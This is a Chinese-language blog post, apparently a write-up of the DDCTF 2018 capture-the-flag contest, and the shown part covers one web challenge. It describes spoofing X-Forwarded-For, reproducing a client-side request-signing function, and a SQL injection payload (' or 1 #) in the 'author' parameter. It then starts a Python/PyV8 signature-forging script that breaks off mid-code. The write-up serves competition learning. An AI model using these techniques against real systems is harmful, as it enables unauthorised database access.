<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html" />














  
  
    
  
  <link href="https://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css" rel="stylesheet" type="text/css" />







  

<link href="https://cdn.bootcss.com/font-awesome/4.6.2/fonts/fontawesome-webfont.svg" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">


  <link rel="manifest" href="/images/manifest.json">


  <meta name="msapplication-config" content="/images/browserconfig.xml" />



  <meta name="keywords" content="CTF,WriteUp," />










<meta name="description" content="前言还记得去年的四、五月份参加的DDCTF混了个名次，蹭了次面试没想到时间过得这么快，今年的DDCTF现在也比完了老了老了这一年我都干了啥.jpg 今年的题比去年的质量好很多，且加上了最有亮点的反作弊系统，每道题每个人的flag不一样，连某些逆向题的源码都不一样，可见十分用心这次学到了很多，希望这样有质量的比赛能够继承下去">
<meta name="keywords" content="CTF,WriteUp">
<meta property="og:type" content="article">
<meta property="og:title" content="又是一年DDCTF">
<meta property="og:url" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/index.html">
<meta property="og:site_name" content="Wz&#39;s Blog">
<meta property="og:description" content="前言还记得去年的四、五月份参加的DDCTF混了个名次，蹭了次面试没想到时间过得这么快，今年的DDCTF现在也比完了老了老了这一年我都干了啥.jpg 今年的题比去年的质量好很多，且加上了最有亮点的反作弊系统，每道题每个人的flag不一样，连某些逆向题的源码都不一样，可见十分用心这次学到了很多，希望这样有质量的比赛能够继承下去">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/2018041802.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-25-24.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-27-43.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-30-07.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-07-07.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-07-41.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-13-01.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-14-47.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/13-49-53.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-36-06.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-37-04.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/13-53-04.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-55-22.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-56-23.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-57-42.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/10-33-28.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/10-48-17.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-01-58.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-02-08.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-03-22.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-08-59.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/11-44-20.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-26-22.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-27-55.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/12-30-36.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/14-52-38.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/14-53-09.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/14-54-39.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/17-48-08.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/17-50-01.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/20-50-39.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/20-54-20.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/21-53-59.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-05-38.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-05-46.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-06-02.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-07-11.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-08-49.png">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-09-27.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-09-48.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-09-56.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-14-23.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-14-51.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-50-28_1.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/22-50-56_1.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/ECB1_1.png">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/ECB2_1.png">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/23-30-06.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/23-37-22.jpg">
<meta property="og:updated_time" content="2018-10-29T03:31:58.969Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="又是一年DDCTF">
<meta name="twitter:description" content="前言还记得去年的四、五月份参加的DDCTF混了个名次，蹭了次面试没想到时间过得这么快，今年的DDCTF现在也比完了老了老了这一年我都干了啥.jpg 今年的题比去年的质量好很多，且加上了最有亮点的反作弊系统，每道题每个人的flag不一样，连某些逆向题的源码都不一样，可见十分用心这次学到了很多，希望这样有质量的比赛能够继承下去">
<meta name="twitter:image" content="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/2018041802.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/"/>





  <title>又是一年DDCTF | Wz's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wz's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">安全菜鸡的挖坑填坑之旅</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            浏览
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2018/04/21/又是一年DDCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="W z">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wz's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">又是一年DDCTF</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-21T11:08:00+08:00">
                2018-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全之旅/" itemprop="url" rel="index">
                    <span itemprop="name">安全之旅</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <img src="/2018/04/21/又是一年DDCTF/2018041802.jpg" alt="2018041802.jpg" title="">
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>还记得去年的四、五月份参加的DDCTF<br>混了个名次，蹭了次面试<br>没想到时间过得这么快，今年的DDCTF现在也比完了<br>老了老了<br>这一年我都干了啥.jpg</p>
<p>今年的题比去年的质量好很多，且加上了最有亮点的反作弊系统，每道题每个人的flag不一样，连某些逆向题的源码都不一样，可见十分用心<br>这次学到了很多，希望这样有质量的比赛能够继承下去</p>
 <a id="more"></a>
<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 - 数据库的秘密"></a>Web1 - 数据库的秘密</h4><p>一道前端计算签名然后sql盲注的web题</p>
<p>进去就是非法链接，很明显需要<code>burp</code>抓一下包然后添个<code>HTTP的X-Forwarded-For</code>为<code>123.232.23.245</code></p>
<img src="/2018/04/21/又是一年DDCTF/11-25-24.jpg" alt="11-25-24.jpg" title="">
<p>然后我们将得到一个很常规的查询界面</p>
<img src="/2018/04/21/又是一年DDCTF/11-27-43.jpg" alt="11-27-43.jpg" title="">
<p>从源码来看传了四个参数过去分别是<code>id</code>，<code>title</code>，<code>date</code>，<code>author</code></p>
<img src="/2018/04/21/又是一年DDCTF/11-30-07.jpg" alt="11-30-07.jpg" title="">
<p>如果我们随便POST一个 <code>id=1&amp;author=asd&amp;date=1&amp;title=s</code>会提示<code>param error</code><br>那么很有可能用<code>JS</code>搞了些事情了，找到页面中引用的<code>JS</code>文件——<code>main.js</code>和<code>math.js</code>查看<code>submit()</code>函数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> str0 = <span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> obj) &#123;</div><div class="line">        <span class="keyword">if</span> (i != <span class="string">'sign'</span>) &#123;</div><div class="line">            str1 = <span class="string">''</span>;</div><div class="line">            str1 = i + <span class="string">'='</span> + obj[i];</div><div class="line">            str0 += str1</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(str0)</div><div class="line">    <span class="built_in">console</span>.log(key)</div><div class="line">    <span class="keyword">return</span> hex_math_enc(str0 + key)</div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> obj = &#123;</div><div class="line">    id: <span class="string">''</span>,</div><div class="line">    title: <span class="string">''</span>,</div><div class="line">    author: <span class="string">''</span>,</div><div class="line">    date: <span class="string">''</span>,</div><div class="line">    time: <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitt</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    obj[<span class="string">'id'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'id'</span>).value;</div><div class="line">    obj[<span class="string">'title'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).value;</div><div class="line">    obj[<span class="string">'author'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'author'</span>).value;</div><div class="line">    obj[<span class="string">'date'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'date'</span>).value;</div><div class="line">    <span class="keyword">var</span> sign = signGenerate(obj, key);</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).action = <span class="string">"index.php?sig="</span> + sign + <span class="string">"&amp;time="</span> + obj.time;</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).submit()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很明显给传递的参数+时间戳数组签了个名 然后将<code>from</code>的地址改为<code>index.php?sig=&quot; + sign + &quot;&amp;time=&quot; + obj.time;</code><br>说明它需要把参数+时间戳的签名算对了，然后再<code>POST</code>到一个加上<code>sig</code>和<code>time</code>的地址才能传递参数<br>我们可以把脚本下载下来，在本地搭一个环境，然后做一些改动如输出签名和时间戳，然后我们再去burp重放一下就能测试哪个参数存在注入漏洞了<br>在签名函数<code>return</code>签名之前，我们将一些主要信息输出，方便测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(obj)</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"time:"</span>+obj.time)</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"sig:"</span>+hex_math_enc(str0 + key))</div><div class="line"><span class="keyword">return</span> hex_math_enc(str0 + key)</div></pre></td></tr></table></figure></p>
<p>这里有个小技巧，因为<code>author</code>参数是<code>hidden</code>的，所以我们可以把它变成<code>text</code>，本地方便我们输入测试得到签名</p>
<img src="/2018/04/21/又是一年DDCTF/12-07-07.jpg" alt="12-07-07.jpg" title="">
<p>效果如下</p>
<img src="/2018/04/21/又是一年DDCTF/12-07-41.jpg" alt="12-07-41.jpg" title="">
<p>得到签名之后我们再去burp重放一下就好了<br>后面我测试得<code>author</code>填单引号的时候界面的数据没了，很明显这个参数可能存在注入</p>
<img src="/2018/04/21/又是一年DDCTF/12-13-01.jpg" alt="12-13-01.jpg" title="">
<p>尝试基本的<code>&#39; or 1 #</code></p>
<img src="/2018/04/21/又是一年DDCTF/12-14-47.jpg" alt="12-14-47.jpg" title="">
<p>那么可以确定存在<code>author</code>这个参数存在注入了<br>再测试一下联合注入啥的，会被假狗waf掉，我直接是选择了盲注，也没啥大问题<br>我的脚本是选择的<code>PyV8</code>库来运行<code>JS</code>脚本<br>将签名的函数提取出来，然后通过<code>PyV8</code>库包装成一个py函数就能得到签名了<br><code>Python</code>代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests, PyV8</div><div class="line"></div><div class="line"><span class="comment">#用PyV8将JS签名函数包装成一个PY函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">js</span><span class="params">(author=<span class="string">''</span>, date=<span class="string">''</span>, id=<span class="string">''</span>, title=<span class="string">''</span>)</span>:</span></div><div class="line">    ctxt = PyV8.JSContext()</div><div class="line">    ctxt.enter()</div><div class="line">    ctxt.locals.author_wz = author</div><div class="line">    ctxt.locals.date_wz = date</div><div class="line">    ctxt.locals.id_wz = id</div><div class="line">    ctxt.locals.title_wz = title</div><div class="line">    ctxt.locals.key = <span class="string">"adrefkfweodfsdpiru"</span></div><div class="line">    func = ctxt.eval(</div><div class="line">        <span class="string">'''</span></div><div class="line"><span class="string">        var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */</span></div><div class="line"><span class="string">        var b64pad = ""; /* base-64 pad character. "=" for strict RFC compliance  */</span></div><div class="line"><span class="string">        var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * These are the functions you'll usually want to call</span></div><div class="line"><span class="string">         * They take string arguments and return either hex or base-64 encoded strings</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function hex_math_enc(s) &#123;</span></div><div class="line"><span class="string">         return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        function b64_math_enc(s) &#123;</span></div><div class="line"><span class="string">         return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        function str_math_enc(s) &#123;</span></div><div class="line"><span class="string">         return binb2str(core_math_enc(str2binb(s), s.length * chrsz));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        function hex_hmac_math_enc(key, data) &#123;</span></div><div class="line"><span class="string">         return binb2hex(core_hmac_math_enc(key, data));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        function b64_hmac_math_enc(key, data) &#123;</span></div><div class="line"><span class="string">         return binb2b64(core_hmac_math_enc(key, data));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        function str_hmac_math_enc(key, data) &#123;</span></div><div class="line"><span class="string">         return binb2str(core_hmac_math_enc(key, data));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Perform a simple self-test to see if the VM is working</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function math_enc_vm_test() &#123;</span></div><div class="line"><span class="string">         return hex_math_enc("abc") == "a9993e364706816aba3e25717850c26c9cd0d89d";</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Calculate the SHA-1 of an array of big-endian words, and a bit length</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function core_math_enc(x, len) &#123;</span></div><div class="line"><span class="string">         /* append padding */</span></div><div class="line"><span class="string">         x[len &gt;&gt; 5] |= 0x80 &lt;&lt; (24 - len % 32);</span></div><div class="line"><span class="string">         x[((len + 64 &gt;&gt; 9) &lt;&lt; 4) + 15] = len;</span></div><div class="line"><span class="string">         var w = Array(80);</span></div><div class="line"><span class="string">         var a = 1732584193;</span></div><div class="line"><span class="string">         var b = -271733879;</span></div><div class="line"><span class="string">         var c = -1732584194;</span></div><div class="line"><span class="string">         var d = 271733878;</span></div><div class="line"><span class="string">         var e = -1009589776;</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; x.length; i += 16) &#123;</span></div><div class="line"><span class="string">          var olda = a;</span></div><div class="line"><span class="string">          var oldb = b;</span></div><div class="line"><span class="string">          var oldc = c;</span></div><div class="line"><span class="string">          var oldd = d;</span></div><div class="line"><span class="string">          var olde = e;</span></div><div class="line"><span class="string">          for (var j = 0; j &lt; 80; j++) &#123;</span></div><div class="line"><span class="string">           if (j &lt; 16) w[j] = x[i + j];</span></div><div class="line"><span class="string">           else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);</span></div><div class="line"><span class="string">           var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));</span></div><div class="line"><span class="string">           e = d;</span></div><div class="line"><span class="string">           d = c;</span></div><div class="line"><span class="string">           c = rol(b, 30);</span></div><div class="line"><span class="string">           b = a;</span></div><div class="line"><span class="string">           a = t;</span></div><div class="line"><span class="string">          &#125;</span></div><div class="line"><span class="string">          a = safe_add(a, olda);</span></div><div class="line"><span class="string">          b = safe_add(b, oldb);</span></div><div class="line"><span class="string">          c = safe_add(c, oldc);</span></div><div class="line"><span class="string">          d = safe_add(d, oldd);</span></div><div class="line"><span class="string">          e = safe_add(e, olde);</span></div><div class="line"><span class="string">         &#125;</span></div><div class="line"><span class="string">         return Array(a, b, c, d, e);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Perform the appropriate triplet combination function for the current</span></div><div class="line"><span class="string">         * iteration</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function math_enc_ft(t, b, c, d) &#123;</span></div><div class="line"><span class="string">         if (t &lt; 20) return (b &amp; c) | ((~b) &amp; d);</span></div><div class="line"><span class="string">         if (t &lt; 40) return b ^ c ^ d;</span></div><div class="line"><span class="string">         if (t &lt; 60) return (b &amp; c) | (b &amp; d) | (c &amp; d);</span></div><div class="line"><span class="string">         return b ^ c ^ d;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Determine the appropriate additive constant for the current iteration</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function math_enc_kt(t) &#123;</span></div><div class="line"><span class="string">         return (t &lt; 20) ? 1518500249 : (t &lt; 40) ? 1859775393 : (t &lt; 60) ? -1894007588 : -899497514;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Calculate the HMAC-SHA1 of a key and some data</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function core_hmac_math_enc(key, data) &#123;</span></div><div class="line"><span class="string">         var bkey = str2binb(key);</span></div><div class="line"><span class="string">         if (bkey.length &gt; 16) bkey = core_math_enc(bkey, key.length * chrsz);</span></div><div class="line"><span class="string">         var ipad = Array(16),</span></div><div 